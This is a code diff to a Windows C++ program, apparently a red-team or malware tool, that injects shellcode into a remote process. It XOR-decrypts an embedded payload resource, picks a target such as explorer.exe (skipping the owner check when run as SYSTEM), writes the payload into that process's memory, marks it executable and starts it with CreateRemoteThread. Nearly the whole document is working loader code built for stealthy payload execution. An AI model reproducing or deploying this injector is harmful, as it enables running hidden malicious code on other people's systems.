@@ -4,42 +4,15 @@
 #include <tchar.h>
 #include "resource.h"
 #include <comdef.h>
+#include <string>
+#include "Header.h"
 #define MAX_NAME 256
 
-unsigned char* xor_decrypt(char*, int);
-int GetUserFromRemoteProcess(DWORD, TCHAR*, TCHAR*);
-int GetLogonFromToken(HANDLE, TCHAR*, TCHAR*);
-DWORD ProcessID(const char*, TCHAR*, TCHAR*);
-BOOL GetCurrentUserAndDomain(PTSTR, PDWORD, PTSTR, PDWORD);
-void GoForth();
-
-unsigned char* xor_decrypt(char* data, int data_len)
+void xor_decrypt(unsigned char* bytes, int data_len, char* key, int key_len)
 {
-	//__debugbreak();
-	unsigned char* charArray = new unsigned char[data_len];
-	//byte* byteArray = new byte[data_len];
-	int key_len = 2;
-	const char* key[2] = { "A","A" };
-
-	//Null out bytearray
 	for (int i = 0; i < data_len; i++) {
-		//__debugbreak();
-		charArray[i] = 0;
+		bytes[i] ^= key[i % key_len];
 	}
-
-	for (int i = 0; i < data_len; i++) {
-		data[i] ^= *key[i % key_len];
-		//Poplulate bytearrray
-		if (data[i] == NULL) {
-			charArray[i] += 00;
-		}
-		else {
-			charArray[i] += data[i];
-		}
-	}
-
-	//delete[] charArray;
-	return charArray;
 }
 
 DWORD ProcessID(const char* ProcessName, TCHAR* domain_current, TCHAR* user_current)
@@ -62,21 +35,27 @@ DWORD ProcessID(const char* ProcessName, TCHAR* domain_current, TCHAR* user_curr
 			//If the found process name is equal to the one we're searching for
 			if (!strcmp(ProcEntry.szExeFile, ProcessName))
 			{
-				//Before passing injection on, check if value of remote process (explorer.exe) is
-				//the same user that ran binary
-				pid = ProcEntry.th32ProcessID;
-				check = GetUserFromRemoteProcess(pid, domain_current, user_current);
-
-				//If true and user and domain match, clean up, pass value to break loop, reeturn PID
-				if (check == TRUE) {
+				if (!strcmp(user_current,"SYSTEM")) {
+					pid = ProcEntry.th32ProcessID;
 					CloseHandle(hSnapshot);
-					//Set to true to break final loop
-					//Return the processID of the found process
+					check == TRUE;
 					return ProcEntry.th32ProcessID;
 				}
-				//If fail, stay in loop, and keep trying
 				else {
-					check = FALSE;
+					//Before passing injection on, check if value of remote process (explorer.exe) is
+					//the same user that ran binary
+					pid = ProcEntry.th32ProcessID;
+					check = GetUserFromRemoteProcess(pid, domain_current, user_current);
+					//If true and user and domain match, clean up, pass value to break loop, reeturn PID
+					if (check == TRUE) {
+						CloseHandle(hSnapshot);
+						//Return the processID of the found process
+						return ProcEntry.th32ProcessID;
+					}
+					//If fail, stay in loop, and keep trying
+					else {
+						check = FALSE;
+					}
 				}
 			}
 		} while (Process32Next(hSnapshot, &ProcEntry) && check == FALSE); //Get the next process
@@ -247,25 +226,24 @@ BOOL GetCurrentUserAndDomain(PTSTR szUser, PDWORD pcchUser, PTSTR szDomain, PDWO
 	return fSuccess;
 }
 
-void GoForth() {
-	//Default inject to explorer
-	char process[254] = "explorer.exe";
-	//.bin binary value
+void GoForth(const char* process) {
+
 	unsigned char* runMe;
+	char key[] = "AA";
 
 	//Make sure to set MAKERESOURCE(int) to whatever is specified in the resource.h file
-	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
+	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(102), RT_RCDATA);
 	DWORD len = SizeofResource(NULL, res);
 	HGLOBAL hResource = LoadResource(NULL, res);
 	LPVOID lpAddress = LockResource(hResource);
 
 	//Copy Resource file to memory space for mods
-	char* bytes = (char*)malloc(len + 1);
+	unsigned char* bytes = (unsigned char*)malloc(len + 1);
 	memcpy(bytes, lpAddress, len);
 
 	//Convert XOR'd rsource file to char array (shellcode)
-	unsigned char* runner = (xor_decrypt(bytes, len));
-	
+	xor_decrypt(bytes, len, key, strlen(key));
+
 	//Set injection variables
 	DWORD oldprotect = 0;
 	LPVOID Memory;
@@ -288,20 +266,29 @@ void GoForth() {
 	Memory = VirtualAllocEx(hProcess, nullptr, len, MEM_COMMIT, PAGE_READWRITE);
 
 	//Write to memory allocated
-	WriteProcessMemory(hProcess, Memory, runner, (SIZE_T)len, (SIZE_T*)NULL);
+	WriteProcessMemory(hProcess, Memory, bytes, (SIZE_T)len, (SIZE_T*)NULL);
 
 	//Set permissions back to read
-	rv = VirtualProtectEx(hProcess, Memory, len, PAGE_EXECUTE_READ, &oldprotect);
+	rv = VirtualProtectEx(hProcess, Memory, len, PAGE_EXECUTE, &oldprotect);
 
 	//Yeet
 	if (rv != 0) {
 		HANDLE th = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)Memory, 0, 0, 0);
 	}
 }
+void Helper() {
+	printf("-----Remote Process Shellcode Injection Helper-----\n");
+	printf("      ex: RemoteShellcodeInject_XOR [process]");
+	exit(0);
+}
 
-
-int main()
+int main(int argc, const char* argv[])
 {
-	GoForth();
+	if (argc != 2 || argv[1] == NULL) {
+		Helper();
+	}
+
+	const char* process = argv[1];
+	GoForth(process);
 	return  0;
 }
